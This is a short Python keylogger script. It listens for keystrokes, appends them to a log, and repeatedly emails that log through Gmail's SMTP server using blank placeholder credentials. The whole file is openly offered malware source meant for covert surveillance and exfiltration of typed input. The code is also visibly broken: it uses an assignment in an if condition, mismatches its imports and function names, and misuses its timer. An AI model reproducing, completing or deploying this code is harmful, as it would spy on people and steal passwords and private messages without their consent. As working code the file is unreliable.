import threading
import keyboard
import smtplib

email = ''
password = ''

log = 'Keylogger started'

def process_key_press(key):
    try:
        log = log + str(key.char)
    except AttributeError:
        if key = key.space:
            log = log + ' '
        else:
            log = log + ' ' + str(key) + ' '
def report():
    send_mail(email, password, log)
    log = ''
    timer = threading.Timer(5, report())
    timer.start()
def send_mail(email, password, message):
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
keyboardListener = pynput.keyboard.Listener(on_press = processKeyPress())

with keyboardListener:
    report()
    keyboardListener.join()
